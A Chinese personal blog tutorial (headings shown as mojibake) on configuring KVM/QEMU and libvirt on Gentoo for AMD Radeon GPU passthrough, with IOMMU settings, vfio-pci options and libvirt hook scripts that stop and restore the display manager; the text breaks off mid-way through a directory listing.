    <content type="html"><![CDATA[<ul><li><a href="#1-%E5%AE%89%E8%A3%85">1 å®‰è£…</a></li><li><a href="#2-%E9%85%8D%E7%BD%AE">2 é…ç½®</a><ul><li><a href="#21-%E6%A1%A5%E6%8E%A5">2.1 æ¡¥æ¥</a></li><li><a href="#22-iommu">2.2 iommu</a></li><li><a href="#23-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E6%B7%BB%E5%8A%A0">2.3 å†…æ ¸æ¨¡å—æ·»åŠ </a></li><li><a href="#24-hook-%E8%84%9A%E6%9C%AC">2.4 hook è„šæœ¬</a></li><li><a href="#25-qemu-%E9%85%8D%E7%BD%AE">2.5 QEMU é…ç½®</a></li></ul></li><li><a href="#3-%E7%9B%B4%E9%80%9A">3 ç›´é€š</a><ul><li><a href="#31-%E5%88%9B%E5%BB%BA%E4%B8%8D%E7%9B%B4%E9%80%9A%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA">3.1 åˆ›å»ºä¸ç›´é€šçš„è™šæ‹Ÿæœº</a></li><li><a href="#32-vbios">3.2 vbios</a></li><li><a href="#33-%E6%B7%BB%E5%8A%A0%E7%9B%B4%E9%80%9A%E8%AE%BE%E5%A4%87">3.3 æ·»åŠ ç›´é€šè®¾å¤‡</a></li></ul></li><li><a href="#4-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3">4 é—®é¢˜è§£å†³</a><ul><li><a href="#41-%E8%BD%AF%E4%BB%B6%E4%B8%8D%E8%83%BD%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Asorry-this-program-cannot-run-under-a-virtual-machine">4.1 è½¯ä»¶ä¸èƒ½è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Š(Sorry, this program cannot run under a virtual machine)</a></li><li><a href="#42-%E9%BB%91%E5%B1%8Fucsi_cgg-1-0008-ucsi_handle_connector_change-get_connector_status-failed">4.2 é»‘å±(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</a></li><li><a href="#42-docker-%E6%A1%A5%E6%8E%A5%E5%8D%A0%E7%94%A8%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1%E5%AF%BC%E8%87%B4%E7%BD%91%E7%BB%9C%E4%B8%8D%E9%80%9A%E7%9A%84%E6%83%85%E5%86%B5">4.2 docker æ¡¥æ¥å ç”¨ç‰©ç†ç½‘å¡å¯¼è‡´ç½‘ç»œä¸é€šçš„æƒ…å†µ</a></li></ul></li></ul><h1 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1 å®‰è£…"></a>1 å®‰è£…</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br>sys-firmware/edk2-ovmf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class="hljs-built_in">enable</span> libvirtd<br>systemctl <span class="hljs-built_in">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure><h1 id="2-é…ç½®"><a href="#2-é…ç½®" class="headerlink" title="2 é…ç½®"></a>2 é…ç½®</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur ~ <span class="hljs-comment"># neofetch</span><br>         -/oyddmdhs+:.                root@worisur<br>     -odNMMMMMMMMNNmhy+-`             ------------<br>   -yNMMMMMMMMMMMNNNmmdhy+-           OS: Gentoo Base System release 2.8 x86_64<br> `omMMMMMMMMMMMMNmdmmmmddhhy/`        Kernel: 5.15.52-gentoo-dist<br> omMMMMMMMMMMMNhhyyyohmdddhhhdo`      Uptime: 19 hours, 43 mins<br>.ydMMMMMMMMMMdhs++so/smdddhhhhdm+`    Packages: 975 (emerge)<br> oyhdmNMMMMMMMNdyooydmddddhhhhyhNd.   Shell: bash 5.1.16<br>  :oyhhdNNMMMMMMMNNNmmdddhhhhhyymMh   Terminal: /dev/pts/0<br>    .:+sydNMMMMMNNNmmmdddhhhhhhmMmy   CPU: AMD Ryzen 9 5900X (24) @ 3.700GHz<br>       /mMMMMMMNNNmmmdddhhhhhmMNhs:   GPU: AMD ATI Radeon RX 6800/6800 XT / 6900 XT<br>    `oNMMMMMMMNNNmmmddddhhdmMNhs+`    Memory: 33068MiB / 64220MiB<br>  `sNMMMMMMMMNNNmmmdddddmNMmhs/.<br> /NMMMMMMMMNNNNmmmdddmNMNdso:`<br>+MMMMMMMNNNNNmmmmdmNMNdso/-<br>yMMNNNNNNNmmmmmNNMmhs+/-`<br>/hMMNNNNNNNNMNdhs++/-`<br>`/ohdmmddhys+++/:.`<br>  `-//////:--.<br></code></pre></td></tr></table></figure><h2 id="2-1-æ¡¥æ¥"><a href="#2-1-æ¡¥æ¥" class="headerlink" title="2.1 æ¡¥æ¥"></a>2.1 æ¡¥æ¥</h2><p><a href="https://blog.51cto.com/u_3823536/2547591">æ— çº¿ç½‘å¡çœ‹è¿™é‡Œ</a></p><p><a href="https://support.huaweicloud.com/dpmg-kunpengwebs/kunpengtomee_04_0008.html">brctlé…ç½®çœ‹è¿™é‡Œ</a></p><ul><li>æˆ‘çš„åšæ³•:</li></ul><p>NetworkManager ç›´æ¥ä½¿ç”¨ <code>nmtui</code> å°†éœ€è¦æ¡¥æ¥çš„ç½‘å¡åŠ è¿›æ–°å»ºçš„ç½‘æ¡¥(å¹¶å°†è¯¥ç½‘å¡çš„macåœ°å€é…ç½®ç»™ç½‘æ¡¥),ç„¶åç»™ç½‘æ¡¥é…ç½®é™æ€çš„åœ°å€(é…ç½®æ–¹å¼å’Œæ™®é€šç½‘å¡æ²¡åŒºåˆ«),è®¾ç½®å¼€æœºå¯åŠ¨</p><h2 id="2-2-iommu"><a href="#2-2-iommu" class="headerlink" title="2.2 iommu"></a>2.2 iommu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/default/grub<br><span class="hljs-comment"># æ·»åŠ å¦‚ä¸‹è¡Œ</span><br><span class="hljs-comment"># AMDå¤„ç†å™¨(æ ¹æ®BIOSè®¾ç½®é»˜è®¤å·²å¯ç”¨ï¼Ÿ)ï¼šamd_iommu=on</span><br><span class="hljs-comment"># å¯è§†æƒ…å†µæ·»åŠ ï¼ˆä¿®å¤æˆ–å¯¼è‡´é»‘å±ï¼‰ï¼šiommu=pt</span><br>GRUB_CMDLINE_LINUX_DEFAULT=<span class="hljs-string">&quot;amd_iommu=on iommu=pt&quot;</span><br><br></code></pre></td></tr></table></figure><p>é‡å¯å,çœ‹çœ‹å¯åŠ¨æ—¥å¿—æ£€æŸ¥ä¸€ä¸‹IOMMUæ˜¯å¦å·²å¯ç”¨,ä½¿ç”¨è¶…çº§ç”¨æˆ·æƒé™è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur ~ <span class="hljs-comment"># dmesg | grep -e DMAR -e iommu</span><br>[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.067146] Kernel <span class="hljs-built_in">command</span> line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.531545] iommu: Default domain <span class="hljs-built_in">type</span>: Passthrough (<span class="hljs-built_in">set</span> via kernel <span class="hljs-built_in">command</span> line)<br>[    0.547978] pci 0000:00:01.0: Adding to iommu group 0<br>[    0.547984] pci 0000:00:01.1: Adding to iommu group 1<br>[    0.547991] pci 0000:00:01.2: Adding to iommu group 2<br>[    0.547997] pci 0000:00:02.0: Adding to iommu group 3<br>[    0.548004] pci 0000:00:03.0: Adding to iommu group 4<br>[    0.548010] pci 0000:00:03.1: Adding to iommu group 5<br>[    0.548016] pci 0000:00:04.0: Adding to iommu group 6<br>[    0.548022] pci 0000:00:05.0: Adding to iommu group 7<br>[    0.548029] pci 0000:00:07.0: Adding to iommu group 8<br>[    0.548034] pci 0000:00:07.1: Adding to iommu group 9<br>[    0.548040] pci 0000:00:08.0: Adding to iommu group 10<br>[    0.548046] pci 0000:00:08.1: Adding to iommu group 11<br>[    0.548054] pci 0000:00:14.0: Adding to iommu group 12<br>[    0.548059] pci 0000:00:14.3: Adding to iommu group 12<br>[    0.548075] pci 0000:00:18.0: Adding to iommu group 13<br>[    0.548079] pci 0000:00:18.1: Adding to iommu group 13<br>[    0.548084] pci 0000:00:18.2: Adding to iommu group 13<br>[    0.548089] pci 0000:00:18.3: Adding to iommu group 13<br>[    0.548093] pci 0000:00:18.4: Adding to iommu group 13<br>[    0.548098] pci 0000:00:18.5: Adding to iommu group 13<br>[    0.548102] pci 0000:00:18.6: Adding to iommu group 13<br>[    0.548107] pci 0000:00:18.7: Adding to iommu group 13<br>[    0.548112] pci 0000:01:00.0: Adding to iommu group 14<br>[    0.548122] pci 0000:02:00.0: Adding to iommu group 15<br>[    0.548128] pci 0000:02:00.1: Adding to iommu group 15<br>[    0.548133] pci 0000:02:00.2: Adding to iommu group 15<br>[    0.548136] pci 0000:03:00.0: Adding to iommu group 15<br>[    0.548139] pci 0000:03:04.0: Adding to iommu group 15<br>[    0.548142] pci 0000:03:08.0: Adding to iommu group 15<br>[    0.548144] pci 0000:03:09.0: Adding to iommu group 15<br>[    0.548147] pci 0000:05:00.0: Adding to iommu group 15<br>[    0.548150] pci 0000:06:00.0: Adding to iommu group 15<br>[    0.548153] pci 0000:07:00.0: Adding to iommu group 15<br>[    0.548159] pci 0000:08:00.0: Adding to iommu group 16<br>[    0.548165] pci 0000:09:00.0: Adding to iommu group 17<br>[    0.548289] pci 0000:0a:00.0: Adding to iommu group 18<br>[    0.548297] pci 0000:0a:00.1: Adding to iommu group 19<br>[    0.548306] pci 0000:0a:00.2: Adding to iommu group 20<br>[    0.548314] pci 0000:0a:00.3: Adding to iommu group 21<br>[    0.548320] pci 0000:0b:00.0: Adding to iommu group 22<br>[    0.548326] pci 0000:0c:00.0: Adding to iommu group 23<br>[    0.548332] pci 0000:0c:00.1: Adding to iommu group 24<br>[    0.548338] pci 0000:0c:00.3: Adding to iommu group 25<br>[    0.548344] pci 0000:0c:00.4: Adding to iommu group 26<br>[    0.549234] perf/amd_iommu: Detected AMD IOMMU <span class="hljs-comment">#0 (2 banks, 4 counters/bank).</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¾å¡ç›¸å…³ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">shopt</span> -s nullglob<br><span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> `find /sys/kernel/iommu_groups/* -maxdepth 0 -<span class="hljs-built_in">type</span> d | <span class="hljs-built_in">sort</span> -V`; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IOMMU Group <span class="hljs-variable">$&#123;g##*/&#125;</span>:&quot;</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-variable">$g</span>/devices/*; <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\t<span class="hljs-subst">$(lspci -nns $&#123;d##*/&#125;)</span>&quot;</span><br>    <span class="hljs-keyword">done</span>;<br><span class="hljs-keyword">done</span>;<br><br><span class="hljs-comment"># ç»“æœ</span><br><br>IOMMU Group 16:<br>        08:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Upstream Port of PCI Express Switch [1002:1478] (rev c1)<br>IOMMU Group 17:<br>        09:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Downstream Port of PCI Express Switch [1002:1479]<br>IOMMU Group 18:<br>        0a:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 [Radeon RX 6800/6800 XT / 6900 XT] [1002:73bf] (rev c1)<br>IOMMU Group 19:<br>        0a:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21/23 HDMI/DP Audio Controller [1002:ab28]<br>IOMMU Group 20:<br>        0a:00.2 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD/ATI] Device [1002:73a6]<br>IOMMU Group 21:<br>        0a:00.3 Serial bus controller [0c80]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 USB [1002:73a4]<br></code></pre></td></tr></table></figure><h2 id="2-3-å†…æ ¸æ¨¡å—æ·»åŠ "><a href="#2-3-å†…æ ¸æ¨¡å—æ·»åŠ " class="headerlink" title="2.3 å†…æ ¸æ¨¡å—æ·»åŠ "></a>2.3 å†…æ ¸æ¨¡å—æ·»åŠ </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é…ç½®idså†…å®¹</span><br>worisur ~ <span class="hljs-comment"># cat /etc/modprobe.d/vfio.conf</span><br>options vfio-pci ids=1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479<br>options vfio-pci disable_idle_d3=1<br>options vfio-pci disable_vga=1<br></code></pre></td></tr></table></figure><h2 id="2-4-hook-è„šæœ¬"><a href="#2-4-hook-è„šæœ¬" class="headerlink" title="2.4 hook è„šæœ¬"></a>2.4 hook è„šæœ¬</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur /etc/libvirt/hooks <span class="hljs-comment"># cat qemu</span><br><span class="hljs-comment">#!/bin/bash</span><br>OBJECT=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OPERATION=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OBJECT</span> == <span class="hljs-string">&quot;miloo&quot;</span> ] || [ <span class="hljs-variable">$OBJECT</span> == <span class="hljs-string">&quot;mod&quot;</span> ] || [ <span class="hljs-variable">$OBJECT</span> == <span class="hljs-string">&quot;work&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$OPERATION</span>&quot;</span> <span class="hljs-keyword">in</span><br>                <span class="hljs-string">&quot;prepare&quot;</span>)<br>                systemctl start libvirt-nosleep@<span class="hljs-string">&quot;<span class="hljs-variable">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                /bin/vfio-startup.sh 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br><br>            <span class="hljs-string">&quot;release&quot;</span>)<br>                systemctl stop libvirt-nosleep@<span class="hljs-string">&quot;<span class="hljs-variable">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                /bin/vfio-teardown.sh 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br>        <span class="hljs-keyword">esac</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur /etc/libvirt/hooks <span class="hljs-comment"># cat vfio-startup.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># Helpful to read output when debugging</span><br><span class="hljs-built_in">set</span> -x<br><br>long_delay=10<br>medium_delay=5<br>short_delay=1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Beginning of startup!&quot;</span><br><br><span class="hljs-keyword">function</span> stop_display_manager_if_running &#123;<br>    <span class="hljs-comment"># Stop dm using systemd</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v systemctl; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> systemctl is-active --quiet <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>.service&quot;</span> ; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            systemctl stop <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>.service&quot;</span><br>        <span class="hljs-keyword">fi</span><br><br>        <span class="hljs-keyword">while</span> systemctl is-active --quiet <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>.service&quot;</span> ; <span class="hljs-keyword">do</span><br>            <span class="hljs-built_in">sleep</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;medium_delay&#125;</span>&quot;</span><br>        <span class="hljs-keyword">done</span><br><br>        <span class="hljs-built_in">return</span><br>    <span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># Stop dm using runit</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v sv; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> sv status <span class="hljs-variable">$1</span> ; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            sv stop <span class="hljs-variable">$1</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-comment"># Stop currently running display manager</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-store-display-manager&quot;</span> ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/vfio-store-display-manager<br><span class="hljs-keyword">fi</span><br><br>stop_display_manager_if_running gdm<br>stop_display_manager_if_running display-manager<br><br><span class="hljs-built_in">sleep</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;medium_delay&#125;</span>&quot;</span><br><br><span class="hljs-comment"># Unbind VTconsoles if currently bound (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-bound-consoles&quot;</span> ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/vfio-bound-consoles<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">for</span> (( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++))<br><span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -x /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;i&#125;</span>; <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">if</span> [ `<span class="hljs-built_in">cat</span> /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;i&#125;</span>/name | grep -c <span class="hljs-string">&quot;frame buffer&quot;</span>` \<br>           = 1 ]; <span class="hljs-keyword">then</span><br>               <span class="hljs-built_in">echo</span> 0 &gt; /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;i&#125;</span>/bind<br>           <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unbinding console <span class="hljs-variable">$&#123;i&#125;</span>&quot;</span><br>           <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> &gt;&gt; /tmp/vfio-bound-consoles<br>      <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># Unbind EFI-Framebuffer</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">rm</span> -f /tmp/vfio-is-nvidia<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> lsmod | grep <span class="hljs-string">&quot;nvidia&quot;</span> &amp;&gt; /dev/null ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;true&quot;</span> &gt;&gt; /tmp/vfio-is-nvidia<br>    <span class="hljs-built_in">echo</span> efi-framebuffer.0 &gt; /sys/bus/platform/drivers/efi-framebuffer/unbind<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End of startup!&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">worisur /etc/libvirt/hooks <span class="hljs-comment"># cat vfio-teardown.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -x<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Beginning of teardown!&quot;</span><br><br><span class="hljs-built_in">sleep</span> 10<br><br><span class="hljs-comment"># Restart Display Manager</span><br>input=<span class="hljs-string">&quot;/tmp/vfio-store-display-manager&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> displayManager; <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v systemctl; <span class="hljs-keyword">then</span><br>    systemctl start <span class="hljs-string">&quot;<span class="hljs-variable">$displayManager</span>.service&quot;</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v sv; <span class="hljs-keyword">then</span><br>      sv start <span class="hljs-variable">$displayManager</span><br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$input</span>&quot;</span><br><br><span class="hljs-comment"># Rebind VT consoles (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br>input=<span class="hljs-string">&quot;/tmp/vfio-bound-consoles&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> consoleNumber; <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -x /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;consoleNumber&#125;</span>; <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">if</span> [ `<span class="hljs-built_in">cat</span> /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;consoleNumber&#125;</span>/name | grep -c <span class="hljs-string">&quot;frame buffer&quot;</span>` \<br>           = 1 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Rebinding console <span class="hljs-variable">$&#123;consoleNumber&#125;</span>&quot;</span><br>          <span class="hljs-built_in">echo</span> 1 &gt; /sys/class/vtconsole/vtcon<span class="hljs-variable">$&#123;consoleNumber&#125;</span>/bind<br>      <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$input</span>&quot;</span><br><br><span class="hljs-comment"># Rebind framebuffer for nvidia</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -e <span class="hljs-string">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;efi-framebuffer.0&quot;</span> &gt; /sys/bus/platform/drivers/efi-framebuffer/bind<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End of teardown!&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æƒé™ä¸º kvm ç”¨æˆ· ç»„ä¸º libvirt</span><br>worisur /etc/libvirt/hooks <span class="hljs-comment"># ls -al</span><br>æ€»ç”¨é‡ 20<br>drwxr-xr-x 2 miloo libvirt 4096  7æœˆ 14 23:35 .<br>drwxr-xr-x 7 root  root    4096  7æœˆ 